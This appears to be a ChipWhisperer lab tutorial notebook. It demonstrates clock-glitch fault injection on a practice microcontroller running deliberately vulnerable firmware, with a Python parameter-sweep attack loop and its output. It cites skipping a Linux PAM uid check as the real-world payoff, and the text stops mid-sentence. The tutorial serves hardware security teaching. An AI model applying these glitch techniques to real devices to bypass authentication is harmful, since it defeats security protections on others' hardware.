
Introduction to Clock Glitch Attacks
====================================

This advanced tutorial will demonstrate clock glitch attacks using the
ChipWhisperer system. This will introduce you to many required features
of the ChipWhisperer system when it comes to glitching. This will be
built on in later tutorials to generate voltage glitching attacks, or
when you wish to attack other targets.


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'OPENADC'
    PLATFORM = 'CWLITEARM'
    CRYPTO_TARGET = 'NONE'
    sample_size = 5

Background on Clock Glitching
-----------------------------

Digital hardware devices almost always expect some form of reliable
clock. We can manipulate the clock being presented to the device to
cause unintended behaviour. We'll be concentrating on microcontrollers
here, however other digital devices (e.g. hardware encryption
accelerators) can also have faults injected using this technique.

Consider a microcontroller first. The following figure is an excerpt the
Atmel AVR ATMega328P datasheet:

.. figure:: https://wiki.newae.com/images/2/20/Mcu-unglitched.png
   :alt: A2\_1

   A2\_1

Rather than loading each instruction from FLASH and performing the
entire execution, the system has a pipeline to speed up the execution
process. This means that an instruction is being decoded while the next
one is being retrieved, as the following diagram shows:

.. figure:: https://wiki.newae.com/images/a/a5/Clock-normal.png
   :alt: A2\_2

   A2\_2

But if we modify the clock, we could have a situation where the system
doesn't have enough time to actually perform an instruction. Consider
the following, where Execute #1 is effectively skipped. Before the
system has time to actually execute it another clock edge comes, causing
the microcontroller to start execution of the next instruction:

.. figure:: https://wiki.newae.com/images/1/1e/Clock-glitched.png
   :alt: A2\_3

   A2\_3

This causes the microcontroller to skip an instruction. Such attacks can
be immensely powerful in practice. Consider for example the following
code from ``linux-util-2.24``:

.. code:: c

    /*
     *   auth.c -- PAM authorization code, common between chsh and chfn
     *   (c) 2012 by Cody Maloney <cmaloney@theoreticalchaos.com>
     *
     *   this program is free software.  you can redistribute it and
     *   modify it under the terms of the gnu general public license.
     *   there is no warranty.
     *
     */

    #include "auth.h"
    #include "pamfail.h"

    int auth_pam(const char *service_name, uid_t uid, const char *username)
    {
        if (uid != 0) {
            pam_handle_t *pamh = NULL;
            struct pam_conv conv = { misc_conv, NULL };
            int retcode;

            retcode = pam_start(service_name, username, &conv, &pamh);
            if (pam_fail_check(pamh, retcode))
                return FALSE;

            retcode = pam_authenticate(pamh, 0);
            if (pam_fail_check(pamh, retcode))
                return FALSE;

            retcode = pam_acct_mgmt(pamh, 0);
            if (retcode == PAM_NEW_AUTHTOK_REQD)
                retcode =
                    pam_chauthtok(pamh, PAM_CHANGE_EXPIRED_AUTHTOK);
            if (pam_fail_check(pamh, retcode))
                return FALSE;

            retcode = pam_setcred(pamh, 0);
            if (pam_fail_check(pamh, retcode))
                return FALSE;

            pam_end(pamh, 0);
            /* no need to establish a session; this isn't a
             * session-oriented activity...  */
        }
        return TRUE;
    }

This is the login code for the Linux OS. Note that if we could skip the
check of ``if (uid != 0)`` and simply branch to the end, we could avoid
having to enter a password. This is the power of glitch attacks - not
that we are breaking encryption, but simply bypassing the entire
authentication module!

Glitch Hardware
---------------

The ChipWhisperer Glitch system uses the same synchronous methodology as
it's Side Channel Analysis (SCA) capture. A system clock (which can come
from either the ChipWhisperer or the Device Under Test (DUT)) is used to
generate the glitches. These glitches are then inserted back into the
clock, although it's possible to use the glitches alone for other
purposes (i.e. for voltage glitching, EM glitching).

The generation of glitches is done with two variable phase shift
modules, configured as follows:

.. figure:: https://wiki.newae.com/images/6/65/Glitchgen-phaseshift.png
   :alt: A2\_4

   A2\_4

The enable line is used to determine when glitches are inserted.
Glitches can be inserted continuously (useful for development) or
triggered by some event. The following figure shows how the glitch can
be muxd to output to the Device Under Test (DUT).

.. figure:: https://wiki.newae.com/images/c/c0/Glitchgen-mux.png
   :alt: A2\_5

   A2\_5

Hardware Support
~~~~~~~~~~~~~~~~

The phase shift blocks use the Digital Clock Manager (DCM) blocks within
the FPGA. These blocks have limited support for run-time configuration
of parameters such as phase delay and frequency generation, and for
maximum performance the configuration must be fixed at design time. The
Xilinx-provided run-time adjustment can shift the phase only by about
+/- 5nS in 30pS increments (exact values vary with operating
conditions).

For most operating conditions this is insufficient - if attacking a
target at 7.37MHz the clock cycle would have a period of 136nS. In order
to provide a larger adjustment range, an advanced FPGA feature called
Partial Reconfiguration (PR) is used. The PR system requires special
partial bitstreams which contain modifications to the FPGA bitstream.
These are stored as two files inside a "firmware" zip which contains
both the FPGA bitstream along with a file called ``glitchwidth.p`` and a
file called ``glitchoffset.p``. If a lone bitstream is being loaded into
the FPGA (i.e. not from the zip-file), the partial reconfiguration
system is disabled, as loading incorrect partial reconfiguration files
could damage the FPGA. This damage is mostly theoretical, more likely
the FPGA will fail to function correctly.

If in the course of following this tutorial you find the FPGA appears to
stop responding (i.e. certain features no longer work correctly), it
could be the partial reconfiguration data is incorrect.

We'll look at how to interface with these features later in the
tutorial.

Setting Up Firmware
-------------------

As with previous tutorials, we'll start by creating a new project from
base firmware, as well as setting up our ``PLATFORM`` and
``CRYPTO_TARGET``. This tutorial doesn't use any crypto, so we'll leave
the latter option as ``NONE``. This time, we'll be using
``glitch-simple``:

Now navigate to the ``glitch-simple-lab1`` folder and open
``glitchsimple.c`` in a code editor. Scroll down until you find the
``glitch1()`` function:

.. code:: c

    void glitch1(void)
    {
        led_ok(1);
        led_error(0);
        
        //Some fake variable
        volatile uint8_t a = 0;
        
        putch('A');
        
        //External trigger logic
        trigger_high();
        trigger_low();
        
        //Should be an infinite loop
        while(a != 2){
        ;
        }    
        
        led_error(1);
        led_error(1);
        led_error(1);
        led_error(1);
        led_error(1);
        led_error(1);
        led_error(1);
        led_error(1);
        led_error(1);
        
        uart_puts("1234");
        
        led_error(1);
        led_error(1);
        led_error(1);
        led_error(1);
        led_error(1);
        led_error(1);
        led_error(1);
        led_error(1);

        //Several loops in order to try and prevent restarting
        while(1){
        ;
        }
        while(1){
        ;
        }
        while(1){
        ;
        }
        while(1){
        ;
        }
        while(1){
        ;
        }    
    }

We can see here that sends back an ``'A'``, toggles the trigger pin,
then enters an infinite loop. After the infinite loop, the device sends
back ``"1234"``. On boards that support it, the firmware will also
activate a green "OK" LED upon entering the function and a red "ERROR"
LED when a successful glitch occurs. Our objective will be to glitch
past the infinite loop.

Before you build, navigate to main(). You'll see some C preprocessor
directives that will allow us to switch between the different functions
whithout having to edit the ``glitchsimple.c`` file. We'll do this via
the ``FUNC_SEL`` makefile variable like so:


**In [2]:**

.. code:: bash

    %%bash -s "$PLATFORM" "$CRYPTO_TARGET"
    cd ../hardware/victims/firmware/glitch-simple
    make PLATFORM=$1 CRYPTO_TARGET=$2 FUNC_SEL=GLITCH1


**Out [2]:**



.. parsed-literal::

    rm -f -- glitchsimple-CWLITEARM.hex
    rm -f -- glitchsimple-CWLITEARM.eep
    rm -f -- glitchsimple-CWLITEARM.cof
    rm -f -- glitchsimple-CWLITEARM.elf
    rm -f -- glitchsimple-CWLITEARM.map
    rm -f -- glitchsimple-CWLITEARM.sym
    rm -f -- glitchsimple-CWLITEARM.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- glitchsimple.s simpleserial.s stm32f3_hal.s stm32f3_hal_lowlevel.s stm32f3_sysmem.s
    rm -f -- glitchsimple.d simpleserial.d stm32f3_hal.d stm32f3_hal_lowlevel.d stm32f3_sysmem.d
    rm -f -- glitchsimple.i simpleserial.i stm32f3_hal.i stm32f3_hal_lowlevel.i stm32f3_sysmem.i
    .
    -------- begin --------
    arm-none-eabi-gcc (GNU Tools for Arm Embedded Processors 7-2018-q2-update) 7.3.1 20180622 (release) [ARM/embedded-7-branch revision 261907]
    Copyright (C) 2017 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: glitchsimple.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -DGLITCH1 -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/glitchsimple.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/glitchsimple.o.d glitchsimple.c -o objdir/glitchsimple.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -DGLITCH1 -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -DGLITCH1 -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal.o.d .././hal/stm32f3/stm32f3_hal.c -o objdir/stm32f3_hal.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal_lowlevel.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -DGLITCH1 -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal_lowlevel.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal_lowlevel.o.d .././hal/stm32f3/stm32f3_hal_lowlevel.c -o objdir/stm32f3_hal_lowlevel.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_sysmem.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -DGLITCH1 -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_sysmem.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_sysmem.o.d .././hal/stm32f3/stm32f3_sysmem.c -o objdir/stm32f3_sysmem.o 
    .
    Assembling: .././hal/stm32f3/stm32f3_startup.S
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir/stm32f3_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f3/stm32f3_startup.S -o objdir/stm32f3_startup.o
    .
    Linking: glitchsimple-CWLITEARM.elf
    arm-none-eabi-gcc -mcpu=cortex-m4 -I. -DGLITCH1 -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/glitchsimple.o -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/glitchsimple-CWLITEARM.elf.d objdir/glitchsimple.o objdir/simpleserial.o objdir/stm32f3_hal.o objdir/stm32f3_hal_lowlevel.o objdir/stm32f3_sysmem.o objdir/stm32f3_startup.o --output glitchsimple-CWLITEARM.elf --specs=nano.specs -T .././hal/stm32f3/LinkerScript.ld -Wl,--gc-sections -lm -Wl,-Map=glitchsimple-CWLITEARM.map,--cref   -lm  
    .
    Creating load file for Flash: glitchsimple-CWLITEARM.hex
    arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature glitchsimple-CWLITEARM.elf glitchsimple-CWLITEARM.hex
    .
    Creating load file for EEPROM: glitchsimple-CWLITEARM.eep
    arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    	--change-section-lma .eeprom=0 --no-change-warnings -O ihex glitchsimple-CWLITEARM.elf glitchsimple-CWLITEARM.eep || exit 0
    .
    Creating Extended Listing: glitchsimple-CWLITEARM.lss
    arm-none-eabi-objdump -h -S -z glitchsimple-CWLITEARM.elf > glitchsimple-CWLITEARM.lss
    .
    Creating Symbol Table: glitchsimple-CWLITEARM.sym
    arm-none-eabi-nm -n glitchsimple-CWLITEARM.elf > glitchsimple-CWLITEARM.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       4240	      8	   1176	   5424	   1530	glitchsimple-CWLITEARM.elf
    +--------------------------------------------------------
    + Built for platform CW-Lite Arm (STM32F3)
    +--------------------------------------------------------



Attack Script
-------------

Setup
~~~~~

Now that we've studied the code and have an objective, we can start
looking at how to control the glitch module via Python. We'll start by
connecting to and setting up the ChipWhisperer, then programming it. As
usual, make sure you modify ``fw_path`` with the path to the file you
built in the last step.


**In [3]:**

.. code:: ipython3

    %run "Helper_Scripts/Setup.ipynb"


**In [4]:**

.. code:: ipython3

    fw_path = "../hardware/victims/firmware/glitch-simple/glitchsimple-{}.hex".format(PLATFORM)


**In [5]:**

.. code:: ipython3

    cw.program_target(scope, prog, fw_path)


**Out [5]:**



.. parsed-literal::

    Detected known STMF32: STM32F302xB(C)/303xB(C)
    Extended erase (0x44), this can take ten seconds or more
    Attempting to program 4247 bytes at 0x8000000
    STM32F Programming flash...
    STM32F Reading flash...
    Verified flash OK, 4247 bytes
    


Since the firmware enters an infinite loop, we'll need to reset the
target between glitch attempts. ``"Helper_Scripts/Setup.ipynb"`` defines
a reset function ``reset_target(scope)`` that we'll use here. Now let's
make sure the firmware works as we expect. We should get ``"hello\nA"``
back after resetting the target.


**In [6]:**

.. code:: ipython3

    target.flush()
    scope.arm()
    reset_target(scope)
    
    ret = scope.capture()
    if ret:
        print("Scope capture timed out")
    response = target.read(timeout = 10)
    print(response)


**Out [6]:**



.. parsed-literal::

     hello
    A
    


Glitch Module
~~~~~~~~~~~~~

All the settings/methods for the glitch module can be accessed under
``scope.glitch``. As usual, documentation for the settings and methods
can be accessed by the python ``help`` command:


**In [7]:**

.. code:: ipython3

    help(scope.glitch)


**Out [7]:**



.. parsed-literal::

    Help on GlitchSettings in module chipwhisperer.capture.scopes.cwhardware.ChipWhispererGlitch object:
    
    class GlitchSettings(chipwhisperer.common.utils.util.DisableNewAttr)
     |  GlitchSettings(cwglitch)
     |  
     |  Provides an ability to disable setting new attributes in a class, useful to prevent typos.
     |  
     |  Usage:
     |  1. Make a class that inherits this class:
     |  >>> class MyClass(DisableNewAttr):
     |  >>>     # Your class definition here
     |  
     |  2. After setting up all attributes that your object needs, call disable_newattr():
     |  >>>     def __init__(self):
     |  >>>         self.my_attr = 123
     |  >>>         self.disable_newattr()
     |  
     |  3. Subclasses raise an AttributeError when trying to make a new attribute:
     |  >>> obj = MyClass()
     |  >>> #obj.my_new_attr = 456   <-- Raises AttributeError
     |  
     |  Method resolution order:
     |      GlitchSettings
     |      chipwhisperer.common.utils.util.DisableNewAttr
     |      builtins.object
     |  
     |  Methods defined here:
     |  
     |  __init__(self, cwglitch)
     |      Initialize self.  See help(type(self)) for accurate signature.
     |  
     |  __repr__(self)
     |      Return repr(self).
     |  
     |  __str__(self)
     |      Return str(self).
     |  
     |  manualTrigger(self)
     |      Manually trigger the glitch output.
     |      
     |      This trigger is most useful in Manual trigger mode, where this is the
     |      only way to cause a glitch.
     |  
     |  readStatus(self)
     |      Read the status of the two glitch DCMs.
     |      
     |      Returns:
     |          A tuple with 4 elements::
     |      
     |           \* phase1: Phase shift of DCM1,
     |           \* phase2: Phase shift of DCM2,
     |           \* lock1: Whether DCM1 is locked,
     |           \* lock2: Whether DCM2 is locked
     |  
     |  resetDcms(self)
     |      Reset the two glitch DCMs.
     |      
     |      This is automatically run after changing the glitch width or offset,
     |      so this function is typically not necessary.
     |  
     |  ----------------------------------------------------------------------
     |  Data descriptors defined here:
     |  
     |  arm_timing
     |      When to arm the glitch in single-shot mode.
     |      
     |      If the glitch module is in "ext_single" trigger mode, it must be armed
     |      when the scope is armed. There are two timings for this event:
     |      
     |       \* "before_scope": The glitch module is armed first.
     |       \* "after_scope": The scope is armed first. This is the default.
     |      
     |      This setting may be helpful if trigger events are happening very early.
     |      
     |      If the glitch module is not in external trigger single-shot mode, this
     |      setting has no effect.
     |      
     |      :Getter: Return the current arm timing ("before_scope" or "after_scope")
     |      
     |      :Setter: Change the arm timing
     |      
     |      Raises:
     |         ValueError: if value not listed above
     |  
     |  clk_src
     |      The clock signal that the glitch DCM is using as input.
     |      
     |      This DCM can be clocked from two different sources:
     |       \* "target": The HS1 clock from the target device
     |       \* "clkgen": The CLKGEN DCM output
     |      
     |      :Getter:
     |         Return the clock signal currently in use
     |      
     |      :Setter:
     |         Change the glitch clock source
     |      
     |      Raises:
     |         ValueError: New value not one of "target" or "clkgen"
     |  
     |  ext_offset
     |      How long the glitch module waits between a trigger and a glitch.
     |      
     |      After the glitch module is triggered, it waits for a number of clock
     |      cycles before generating glitch pulses. This delay allows the glitch to
     |      be inserted at a precise moment during the target's execution to glitch
     |      specific instructions.
     |      
     |      .. note::
     |          It is possible to get more precise offsets by clocking the
     |          glitch module faster than the target board.
     |      
     |      This offset must be in the range [0, 2\*\*32).
     |      
     |      :Getter: Return the current external trigger offset.
     |      
     |      :Setter: Set the external trigger offset.
     |      
     |      Raises:
     |         TypeError: if offset not an integer
     |         ValueError: if offset outside of range [0, 2\*\*32)
     |  
     |  offset
     |      The offset from a rising clock edge to a glitch pulse rising edge,
     |      as a percentage of one period.
     |      
     |      A pulse may begin anywhere from -49.8% to 49.8% away from a rising
     |      edge, allowing glitches to be swept over the entire clock cycle.
     |      
     |      :Getter: Return a float with the current glitch offset.
     |      
     |      :Setter: Set the glitch offset. The new value is rounded to the nearest
     |          possible offset.
     |      
     |      Raises:
     |         TypeError: offset not an integer
     |         UserWarning: value outside range [-50, 50] (value is rounded)
     |  
     |  offset_fine
     |      The fine adjustment value on the glitch offset.
     |      
     |      This is a dimensionless number that makes small adjustments to the
     |      glitch pulses' offset. Valid range is [-255, 255].
     |      
     |      :Getter: Return the current glitch fine offset
     |      
     |      :Setter: Update the glitch fine offset
     |      
     |      Raises:
     |         TypeError: if offset not an integer
     |         ValueError: if offset is outside of [-255, 255]
     |  
     |  output
     |      The type of output produced by the glitch module.
     |      
     |      There are 5 ways that the glitch module can combine the clock with its
     |      glitch pulses:
     |      
     |       \* "clock_only": Output only the original input clock.
     |       \* "glitch_only": Output only the glitch pulses - do not use the clock.
     |       \* "clock_or": Output is high if either the clock or glitch are high.
     |       \* "clock_xor": Output is high if clock and glitch are different.
     |       \* "enable_only": Output is high for glitch.repeat cycles.
     |      
     |      Some of these settings are only useful in certain scenarios:
     |       \* Clock glitching: "clock_or" or "clock_xor"
     |       \* Voltage glitching: "glitch_only" or "enable_only"
     |      
     |      :Getter: Return the current glitch output mode (one of above strings)
     |      
     |      :Setter: Change the glitch output mode.
     |      
     |      Raises:
     |         ValueError: if value not in above strings
     |  
     |  repeat
     |      The number of glitch pulses to generate per trigger.
     |      
     |      When the glitch module is triggered, it produces a number of pulses
     |      that can be combined with the clock signal. This setting allows for
     |      the glitch module to produce stronger glitches (especially during
     |      voltage glitching).
     |      
     |      Repeat counter must be in the range [1, 255].
     |      
     |      :Getter: Return the current repeat value (integer)
     |      
     |      :Setter: Set the repeat counter
     |      
     |      Raises:
     |         TypeError: if value not an integer
     |         ValueError: if value outside [1, 255]
     |  
     |  trigger_src
     |      The trigger signal for the glitch pulses.
     |      
     |      The glitch module can use four different types of triggers:
     |       \* "continuous": Constantly trigger glitches
     |       \* "manual": Only trigger glitches through API calls/GUI actions
     |       \* "ext_single": Use the trigger module. One glitch per scope arm.
     |       \* "ext_continuous": Use the trigger module. Many glitches per arm.
     |      
     |      :Getter: Return the current trigger source.
     |      
     |      :Setter: Change the trigger source.
     |      
     |      Raises:
     |         ValueError: value not listed above.
     |  
     |  width
     |      The width of a single glitch pulse, as a percentage of one period.
     |      
     |      One pulse can range from -49.8% to roughly 49.8% of a period. The
     |      system may not be reliable at 0%. Note that negative widths are allowed;
     |      these act as if they are positive widths on the other half of the
     |      clock cycle.
     |      
     |      :Getter: Return a float with the current glitch width.
     |      
     |      :Setter: Update the glitch pulse width. The value will be adjusted to
     |          the closest possible glitch width.
     |      
     |      Raises:
     |         UserWarning: Width outside of [-49.8, 49.8]. The value is rounded
     |             to one of these
     |  
     |  width_fine
     |      The fine adjustment value on the glitch width.
     |      
     |      This is a dimensionless number that makes small adjustments to the
     |      glitch pulses' width. Valid range is [-255, 255].
     |      
     |      :Getter: Return the current glitch fine width
     |      
     |      :Setter: Update the glitch fine width
     |      
     |      Raises:
     |         TypeError: offset not an integer
     |         ValueError: offset is outside of [-255, 255]
     |  
     |  ----------------------------------------------------------------------
     |  Methods inherited from chipwhisperer.common.utils.util.DisableNewAttr:
     |  
     |  __setattr__(self, name, value)
     |      Implement setattr(self, name, value).
     |  
     |  disable_newattr(self)
     |  
     |  enable_newattr(self)
     |  
     |  ----------------------------------------------------------------------
     |  Data descriptors inherited from chipwhisperer.common.utils.util.DisableNewAttr:
     |  
     |  __dict__
     |      dictionary for instance variables (if defined)
     |  
     |  __weakref__
     |      list of weak references to the object (if defined)
    
    


Some of the important settings we'll want to look at here are:

-  clk\_src > The clock signal that the glitch DCM is using as input.
   Can be set to "target" or "clkgen" In this case, we'll be providing
   the clock to the target, so we'll want this set to "clkgen"
-  offset > Where in the output clock to place the glitch. Can be in the
   range ``[-50, 50]``. Often, we'll want to try many offsets when
   trying to glitch a target.
-  width > How wide to make the glitch. Can be in the range
   ``[-50, 50]``. Wider glitches more easily cause glitches, but are
   also more likely to crash the target, meaning we'll often want to try
   a range of widths when attacking a target.
-  output > The output produced by the glitch module. For clock
   glitching, clock\_xor is often the most useful option.
-  ext\_offset > The number of clock cycles after the trigger to put the
   glitch.
-  repeat > The number of clock cycles to repeat the glitch for. Higher
   values increase the number of instructions that can be glitched, but
   often increase the risk of crashing the target.
-  trigger\_src > How to trigger the glitch. For this tutorial, we want
   to automatically trigger the glitch from the trigger pin only after
   arming the ChipWhipserer, so we'll use ``ext_single``

In addition, we'll need to tell ChipWhipserer to use the glitch module's
output as a clock source for the target by setting
``scope.io.hs2 = "glitch"``. We'll also setup a large ``repeat`` to make
glitching easier. Finally, we'll also use a ``namedtuple`` to make
looping through parameters simpler.


**In [8]:**

.. code:: ipython3

    from collections import namedtuple
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "clock_xor"
    scope.glitch.trigger_src = "ext_single"
    
    scope.io.hs2 = "glitch"
    
    Range = namedtuple('Range', ['min', 'max', 'step'])
    if PLATFORM == "CWLITEXMEGA" or PLATFORM == "CW303":
        offset_range = Range(-10, 10, 1)
        scope.glitch.repeat = 105
    elif PLATFORM == "CWLITEARM" or PLATFORM == "CW308_STM32F3":
        offset_range = Range(-49, -30, 1)
        scope.glitch.ext_offset = 37
        scope.glitch.repeat = 10
        
    print(scope.glitch)


**Out [8]:**



.. parsed-literal::

    clk_src     = clkgen
    width       = 10.15625
    width_fine  = 0
    offset      = 10.15625
    offset_fine = 0
    trigger_src = ext_single
    arm_timing  = after_scope
    ext_offset  = 37
    repeat      = 10
    output      = clock_xor
    
    


Attack Loop
~~~~~~~~~~~

Now that the setup's done and we know how to use the glitch module, we
can start our attack. The key parameters that we'll need to iterate
through are ``width`` and ``offset``, so we'll need some loops to change
these. To know if we got a successful glitch, we'll check for "1234" in
the output we get back.

One additional improvement that we can make is to try each parameter
multiple times and keep track of the success rate. Incorporating all of
these improvements, our loop looks like:


**In [9]:**

.. code:: ipython3

    from collections import namedtuple
    from tqdm import tnrange
    
    width_range = Range(-10, 10, 1)
    
    scope.glitch.width = width_range.min
    attack1_data = []
    
    while scope.glitch.width < width_range.max:
        scope.glitch.offset = offset_range.min
        while scope.glitch.offset < offset_range.max:
            successes = 0
            for i in tnrange(sample_size, leave=False):
                scope.arm()
                reset_target(scope)
                ret = scope.capture()
                if ret:
                    print('Timeout happened during acquisition')
                    
                response = target.read(timeout = 10)
    
                # for table display purposes
                success = '1234' in repr(response) # check for glitch success (depends on targets active firmware)
                if success:
                    successes += 1
                
            attack1_data.append([scope.glitch.width, scope.glitch.offset, successes/sample_size, repr(response)]) 
            # run aux stuff that should happen after trace here
            scope.glitch.offset += offset_range.step
        scope.glitch.width += width_range.step
    print("Done glitching")


**Out [9]:**






























































































































































































































































































































































































































































Now that we've tried some glitches, let's look at the results. There's
going to be a lot of data here, so we'll only print parameters that lead
to successful glitches:


**In [10]:**

.. code:: ipython3

    for row in attack1_data:
        if row[2] > 0:
            print(row)
        #print(row)


**Out [10]:**



.. parsed-literal::

    [-10.15625, -38.28125, 1.0, "'\\x00hello\\nA1234'"]
    [-10.15625, -37.109375, 0.8, "'\\x00hello\\nA1234'"]
    [-8.984375, -38.28125, 1.0, "'\\x00hello\\nA1234'"]
    [-8.984375, -37.109375, 1.0, "'\\x00hello\\nA1234'"]
    [-7.8125, -38.28125, 1.0, "'\\x00hello\\nA1234'"]
    [-7.8125, -37.109375, 1.0, "'\\x00hello\\nA1234'"]
    [-6.640625, -38.28125, 1.0, "'\\x00hello\\nA1234'"]
    [-6.640625, -37.109375, 0.8, "'\\x00hello\\nA1234'"]
    [-5.46875, -38.28125, 1.0, "'\\x00hello\\nA1234'"]
    [-5.46875, -37.109375, 1.0, "'\\x00hello\\nA1234'"]
    [-4.296875, -38.28125, 1.0, "'\\x00hello\\nA1234'"]
    [-4.296875, -37.109375, 1.0, "'\\x00hello\\nA1234'"]
    [-3.125, -38.28125, 1.0, "'\\x00hello\\nA1234'"]
    [-3.125, -37.109375, 1.0, "'\\x00hello\\nA1234'"]
    [-1.953125, -38.28125, 1.0, "'\\x00hello\\nA1234'"]
    [-1.953125, -37.109375, 0.8, "'\\x00hello\\nA1234'"]
    [0.390625, -35.9375, 0.2, "'\\x00hello\\nA'"]
    [0.390625, -31.25, 0.2, "'\\x00hello\\nA'"]
    [1.5625, -42.96875, 0.2, "'\\x00hello\\nA1234'"]
    [1.5625, -41.796875, 0.2, "'\\x00hello\\nA'"]
    [1.5625, -37.109375, 0.2, "'\\x00hello\\nA1234'"]
    [1.5625, -30.078125, 0.2, "'\\x00hello\\nA1234'"]
    


With any luck, you'll have some successful glitches. Create a smaller
range of offsets and widths where the majority of successful glitches
can be found. This will greatly speed up future attacks (though be sure
not to make the bounds too small, since you might miss successful
settings for some attacks). For example, you may have found most of your
glitches between a width ``[-9,-5]`` and an offset of ``[-37, -40]``, so
good ranges might be ``[-10, -4]`` and ``[-35, -41]``.

If you didn't get any successful glitches, note that we only used an
``offset`` of ``[-10,10]`` or ``[-49, -30]`` (the max is ``[-50, 50]``).
Try using a larger range of offsets to see if a successful offset lies
outside of this range.

If you want to take this attack further, try reducing the ``repeat`` to
1 and iterating through ``ext_offset`` to look for the precise clock
